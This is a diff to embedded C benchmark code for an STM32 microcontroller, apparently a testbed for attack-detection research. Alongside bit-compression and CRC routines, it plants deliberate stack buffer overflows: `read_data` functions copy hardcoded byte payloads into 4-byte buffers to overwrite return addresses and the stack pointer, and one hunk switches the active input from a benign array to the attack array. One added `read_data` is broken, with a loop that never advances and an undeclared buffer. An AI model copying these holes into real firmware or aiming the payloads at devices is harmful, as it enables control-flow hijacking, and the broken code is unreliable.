@@ -4,6 +4,197 @@
 #include "stm32l5xx_hal_tim.h"
 #include "core_cm33.h"
 
+#if APP_SEL == AHA_COMPRESS
+
+unsigned int compress1(unsigned int x, unsigned int mask) {
+  unsigned int result = 0, bit = 1;
+  while (mask != 0) {
+    if ((mask & 1) != 0) {
+      if (x & 1)
+      {
+        result |= bit;
+        bit <<= 1;
+      } else {
+        bit <<= 1;
+      }
+    }
+    mask >>= 1;
+    x >>= 1;
+  }
+  return result;
+}
+
+/* A version with no branches in the loop.  Eight insns in the loop,
+giving 8*32 + 2 = 258 insns worst case (however, the code above might
+be faster if the mask is sparse). */
+
+// ------------------------------ cut ----------------------------------
+unsigned int compress2(unsigned int x, unsigned int m) {
+   unsigned r, s, b;    // Result, shift, mask bit.
+
+   r = 0;
+   s = 0;
+   do {
+      b = m & 1;
+      r = r | ((x & b) << s);
+      s = s + b;
+      x = x >> 1;
+      m = m >> 1;
+   } while (m != 0);
+   return r;
+}
+// ---------------------------- end cut --------------------------------
+
+/* Code from GLS.  Runs on a basic RISC in 159 ops total, incl.
+subroutine overhead (just 3 ops).  Makes it clear that the five
+masks can be precomputed if the mask is known (the five masks are
+independent of x).  But this costs 5 stores and 5 loads because
+"masks" is an array.  */
+
+unsigned int compress3(unsigned int x, unsigned int mask) {
+  unsigned int masks[5];
+
+  unsigned int q, m, zm;
+  int i;
+  m = ~mask;
+  zm = mask;
+  for (i = 0; i < 5; i++) {
+      q = m;
+      m ^= m << 1;
+      m ^= m << 2;
+      m ^= m << 4;
+      m ^= m << 8;
+      m ^= m << 16;
+      masks[i] = (m << 1) & zm;
+      m = q & ~m;
+      q = zm & masks[i]; zm = zm ^ q ^ (q >> (1 << i));
+  }
+  x = x & mask;
+  q = x & masks[0];  x = x ^ q ^ (q >> 1);
+  q = x & masks[1];  x = x ^ q ^ (q >> 2);
+  q = x & masks[2];  x = x ^ q ^ (q >> 4);
+  q = x & masks[3];  x = x ^ q ^ (q >> 8);
+  q = x & masks[4];  x = x ^ q ^ (q >> 16);
+  return x;
+}
+
+/* Modification of GLS's code in which last 5 lines are
+merged into the loop, to avoid the stores and loads of
+array "masks."  Num. insns. = 5*24 + 7 = 127 total
+(compiled to Cyclops and adding 1 for the "andc" op).
+   Michael Dalton has observed that the first shift left
+can be omitted. */
+
+// ------------------------------ cut ----------------------------------
+/// overwrites return address to 0xe046
+char user_input[33] = {0xa, 0xb, 0xc, 0xd, 
+                      // 0x0, 0x0, 0x0, 0x0, 
+                      // 0x5, 0x0, 0x0, 0x0,
+                      // 0x1, 0x0, 0x0, 0x0, 
+                      // 0x0, 0x0, 0x0, 0x0, 
+                      // 0x0, 0x0, 0x0, 0x0, 
+                      // 0xe0, 0xff, 0x03, 0x20,
+                      0xa1, 0xa2, 0xa3, 0xa4, 
+                      0xb1, 0xb2, 0xb3, 0xb4, 
+                      0xc1, 0xc2, 0xc3, 0xc4, 
+                      0xd1, 0xd2, 0xd3, 0xd4, 
+                      0xe1, 0xe2, 0xe3, 0xe4, 
+                      0xe0, 0xff, 0x03, 0x20, 
+                      0x25, 0x06, 0x04, 0x08, //8040624
+                      1};
+
+void read_data(char * entry){
+    // simulate receive
+    int  i = 0;
+    while(user_input[i] != 1){
+        // save read value
+        entry[i] = user_input[i];
+        i++;
+    }
+}
+
+unsigned int compress4(unsigned int x, unsigned int m) {
+  char buffer[4];
+  read_data(buffer);
+
+  unsigned int mk, mp, mv, t;
+  int i;
+
+  x = x & m;           // Clear irrelevant bits.
+  mk = ~m << 1;        // We will count 0's to right.
+
+  for (i = 0; i < 5; i++) {
+    mp = mk ^ (mk << 1);              // Parallel suffix.
+    mp = mp ^ (mp << 2);
+    mp = mp ^ (mp << 4);
+    mp = mp ^ (mp << 8);
+    mp = mp ^ (mp << 16);
+    mv = mp & m;                      // Bits to move.
+    m = (m ^ mv) | (mv >> (1 << i));    // Compress m.
+    t = x & mv;
+    x = (x ^ t) | (t >> (1 << i));      // Compress x.
+    mk = mk & ~mp;
+  }
+  return x;
+}
+
+const unsigned int test[3] = {
+//       Data        Mask       Result
+    0xFFFF, 0x8000, 0x0001,
+    // 0xFFFF, 0x084A, 0x001F,
+    // 0xFFFF, 0x5555, 0xFFFF,
+    // 0xFFFF, 0x0F55, 0x1FFF,
+    // 0x4567, 0x00FF, 0x4567,
+    // 0x4567, 0xFF00, 0x0123,
+    // 0xFFFF, 0xFFFF, 0xFFFF,
+    // 0,      0,          0,
+    // 0,      0xFFFF, 0,
+    // 0xFFFF, 0,          0,
+    // 0x0000, 0x8000, 1,
+    // 0x5555, 0x5555, 0xFFFF,
+    // 0x5555, 0xAAAA, 0,
+    // 0xBCDE, 0x0F0F, 0x8ACE,
+    // 0xBCDE, 0xF0F0, 0x79BD,
+    // 0x5678, 0x8000, 0x0001,
+    // 0x5678, 0xF035, 0x04ec,
+    // 0x0000, 0xF035, 0x2000,
+};
+
+int errors = 0;
+void application()
+{
+   int errors = 0,  n, i = 0;
+   unsigned int r;
+
+   // n = sizeof(test)/sizeof(test[0]);
+
+   // for (i = 0; i < n; i += 3) {
+    r = compress1(test[i], test[i+1]);
+    if (r != test[i+2])
+       errors = 1;
+   // }
+
+   // for (i = 0; i < n; i += 3) {
+    r = compress2(test[i], test[i+1]);
+    if (r != test[i+2])
+       errors = 1;
+   // }
+
+   // for (i = 0; i < n; i += 3) {
+    r = compress3(test[i], test[i+1]);
+    if (r != test[i+2])
+       errors = 1;
+   // }
+
+   // for (i = 0; i < n; i += 3) {
+    r = compress4(test[i], test[i+1]);
+    if (r != test[i+2])
+       errors = 1;
+   // }
+    SECURE_record_output_data(errors);
+}
+#endif
+
 #if APP_SEL == PRIME
 typedef  unsigned char  bool;
 typedef  unsigned long  ulong;
@@ -53,6 +244,7 @@ void application (void)
 #endif
 
 #if APP_SEL == DUFF
+
 /* $Id: duff.c,v 1.2 2005/04/04 11:34:58 csg Exp $ */
 
 
@@ -278,31 +470,51 @@ const static UNS_32_BITS crc_32_tab[] = { /* CRC polynomial 0xedb88320 */
    For BEEBS this gets round different operating systems using different
    multipliers and offsets and RAND_MAX variations. */
 
-static long int seed = 0;
+/// overwrites return address to 0xe192
+// char user_input[13] = {0xa, 0xb, 0xc, 0xd, 0x02, 0x68, 0xaa, 0xbb, 0xdd, 0xee, 0x40, 0xe0, 1};
+// 80402b8+1
+char user_input[17] = {0x0a, 0x0b, 0x0c, 0x0d,
+                      0x00, 0x02, 0x00, 0x00, 
+                      0xe8, 0xff, 0x03, 0x20,
+                      0xb9, 0x02, 0x04, 0x08, 
+                      0x1};
+
+void read_data(char * entry){
+    // simulate receive
+    int  i = 0;
+    while(user_input[i] != 1){
+        // save read value
+        entry[i] = user_input[i];
+        i++;
+    }
+}
 
 static int
 rand_beebs ()
 {
+  static long int seed = 0;
 
   seed = (seed * 1103515245L + 12345) & ((1UL << 31) - 1);
   return (int) (seed >> 16);
 
 }
 
+DWORD oldcrc32;
 
-DWORD crc32pseudo()
+char crc32pseudo()
 {
-   int i;
-   register DWORD oldcrc32;
+   char buffer[4];
+   read_data(buffer);
 
    oldcrc32 = 0xFFFFFFFF;
-
+   int i;
    for (i = 0 ; i < 1024; ++i)
    {
       oldcrc32 = UPDC32(rand_beebs(), oldcrc32);
    }
 
-   return ~oldcrc32;
+   // return ~oldcrc32;
+   return buffer[3];
 }
 
 void application()
@@ -1145,10 +1357,14 @@ void application() {
 
 // int test = 0;
 int data = 0;
-void (*fun)();
 
 // void fun1() { test = 1; } 
 // void fun2() { test = 2; } 
+
+int start_value(){
+  int init = 1;
+  return init;
+}
 
 void reset_then_evaluate(){
   data = 0;
@@ -1166,20 +1382,28 @@ void evaluate(int value){
   }
 }
 
-int init = 1;
+uint8_t bad_input[8] = {'a', 'a', 'a', 'a', 'a', 'a', 'a', ':'}; 
+void read_data(){
+  int i=0;
+  while(bad_input[i] != ':'){
+    buffer[i] = bad_input[i];
+  }
+}
 
 void application(){
-    if (init){
-      fun = &reset_then_evaluate;
-    } else {
-      fun = &evaluate;
-    }
+  void (*fun)();
+  int init = start_value();
+  uint8_t buffer[4];
 
-    fun();
-    
-    for(int i=1; i<32; i++){
-      evaluate(i);
-    }
+  read_data(buffer);
+
+  if (init){
+    fun = &reset_then_evaluate;
+  } else {
+    fun = &evaluate;
+  }
+
+  fun();
 }
 
 #endif
@@ -1462,11 +1686,11 @@ void application(){
 #define cmd_all             'a'
 
 /** Benign: calls Ultrasonic only **/
-char input[4] = {'u', 0, 16, ':'};
+// char input[4] = {'u', 0, 16, ':'};
 //
 /** Attack: overwrites return address and stack pointer to cause infinite loop in process_command function **/ 
 //
-// char input[33] = {'b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b',0xb4,0x06,0x04,0x08, 0xf0, 0xff, 0x03, 0x20, 0xcd, 0x05, 0x04, 0x08, ':'};
+char input[33] = {'b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b','b',0xb4,0x06,0x04,0x08, 0xf0, 0xff, 0x03, 0x20, 0xcd, 0x05, 0x04, 0x08, ':'};
 //
 uint32_t data[4] = {0,0,0,0};
 uint8_t temp_data[5] = {0,0,0,0,0};
